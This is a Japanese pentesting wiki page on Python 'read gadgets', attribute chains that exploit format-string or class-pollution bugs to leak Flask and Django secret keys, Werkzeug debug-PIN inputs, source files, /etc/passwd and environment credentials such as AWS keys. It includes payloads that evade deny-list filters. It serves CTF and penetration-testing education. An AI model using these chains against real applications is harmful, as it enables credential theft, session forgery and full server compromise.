# Python 内部読み取り Gadget

{{#include ../../banners/hacktricks-training.md}}

## 基本情報

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) や [**Class Pollution**](class-pollution-pythons-prototype-pollution.md) などのさまざまな脆弱性により、**Python の内部データを読み取れるものの、コードを実行できない**場合があります。そのため、pentester はこの読み取り権限を最大限に活用し、**機密性の高い権限を取得して脆弱性をエスカレート**する必要があります。

### Flask - secret key の読み取り

Flask アプリケーションのメインページには、この **secret が設定されている** **`app`** グローバルオブジェクトが存在する可能性があります。
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
このケースでは、[**Bypass Python sandboxes page**](bypass-python-sandboxes/index.html) にある **access global objects** 用の任意の gadget を使うだけで、このオブジェクトにアクセスできます。

**vulnerability が別の python file にある場合**は、ファイルをたどる gadget を使ってメインのファイルに到達し、**global object `app.secret_key` にアクセス**する必要があります。その後、このキーを知っていることで [**escalate privileges**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign) できます。

[この writeup](https://ctftime.org/writeup/36082)<sup>[[3]](#references)</sup> にある次のような payload:
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
この payload を使用して **`app.secret_key` を読み取る**。元の bug に write primitive（例えば class pollution）もある場合、同じ path を使ってこれを置き換え、より高い権限を持つ Flask cookies に署名できる。

### Werkzeug - machine_id and node uuid

[**この writeup の payload を使用すると**](https://vozec.fr/writeups/tweedle-dum-dee/)、**machine_id** と **uuid** node にアクセスできる。これらは、[**Werkzeug pin を生成する**](../../network-services-pentesting/pentesting-web/werkzeug.md)ため、および **debug mode が有効**な場合に `/console` の python console にアクセスするために必要な **private bits** である:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> **error**をWebページで発生させることで、**`app.py`へのサーバーのローカルパス**を取得でき、その**パスが表示される**ことに注意してください。

脆弱性が別のpythonファイルにある場合は、メインのpythonファイルからオブジェクトにアクセスするために、前述のFlask trickを確認してください。

### Django - SECRET_KEY and settings module

Django settings objectは、アプリケーションの起動後に`sys.modules`へキャッシュされます。read primitivesだけで、**`SECRET_KEY`**、fallback keys、database credentials、またはsigning saltsをleakできます：
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
脆弱な gadget が別の module にある場合は、まず globals を辿ります:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` は現在の `SECRET_KEY` と同じくらい価値があります。ローテーション中も、古い署名済みの値を引き続き検証できるためです。<sup>[[1]](#references)</sup> また、`SESSION_ENGINE` と `SESSION_SERIALIZER` も leak させると、影響が cookie forgery だけなのか、それともさらに強力なものなのかをすぐに判断できます。Web への影響の詳細については、[**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md) を確認してください。

### Module loader gadgets - ソースコードとファイルの読み取り

Loaded Python modules は通常 `__loader__` を保持しています。File-backed loaders は頻繁に `get_source()` と `get_data()` を公開しており、すでに module object に到達できるものの `open()` には到達できない場合に、完全な **read-only primitives** として利用できます。
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
これは、**config modules、blueprints、helper files、または hidden routes** を dump し、API keys、DSNs、flag paths、または追加の gadget entry points を取得するのに非常に役立ちます。

subclass enumeration しかない場合は、index を hard-code する代わりに、名前で loader を検索します。
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

generator/coroutine object を作成または到達できる場合、その frame から、function `__globals__` gadget を必要とせずに globals を leak できます。これは、dunder name のみをブロックし、`gi_frame`、`ag_frame`、`cr_frame`、`f_globals` などの frame attributes を見落としている filter に対して有用です。
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
フレームの globals を取得したら、他の gadget（`sys.modules`、settings オブジェクト、`os.environ` など）とまったく同じように続けます。最近の sandbox escape では、`gi_frame` と `f_globals` が dunder 属性ではなく、単純な deny-list を回避して残っていることが多いため、これが何度も再発見されています。

### ロード済みモジュール経由の環境変数 / cloud creds

多くの jail では、どこかで `os` または `sys` が import されています。到達可能な任意の関数の `__init__.__globals__` を悪用して、すでに import されている `os` モジュールへ pivot し、API tokens、cloud keys、flags を含む **環境変数** をダンプできます。
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
サブクラスインデックスがフィルタリングされている場合は、loadersを使用します：
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
環境変数は、read から完全な侵害へ移行するために必要な唯一の secrets であることが頻繁にあります（cloud IAM keys、database URLs、signing keys など）。

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)、影響を受けるバージョン `<0.61.0`) では、細工した component requests を通じた **class pollution** が可能でした。`__init__.__globals__` のような property path によって component-module globals や imported modules に到達できました。この advisory では、read-only exploit ではなく、Django の `SECRET_KEY` と `os.environ` 内の values を上書きする方法が示されています。<sup>[[5]](#references)</sup> 別の bug によって同じ object graph への read access が提供される場合、code execution を必要とせずに、それらの globals から configuration や credentials が漏えいする可能性があります。

### Chaining 用の Gadget collections

Recent CTFs と pyjail research では、attribute access と subclass enumeration だけで構築された信頼性の高い read chains が示されています。[**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker) のような community-maintained lists には、objects から `__globals__`、`sys.modules`、最終的に sensitive data へ traverse するために組み合わせられる、数百個の最小限の gadgets が catalog されています。<sup>[[2]](#references)</sup> raw subclass indexes よりも **attribute/name based searches** を優先してください。`os._wrap_close`、`FileLoader`、`warnings.catch_warnings` などの位置は、Python versions や追加で imported libraries によって変化するためです。

## References

- [1] [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / Writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – FCSC 2023 writeup](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Django-Unicorn Class Pollution Vulnerability, Leading to RCE, XSS, DoS and Authentication Bypass (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
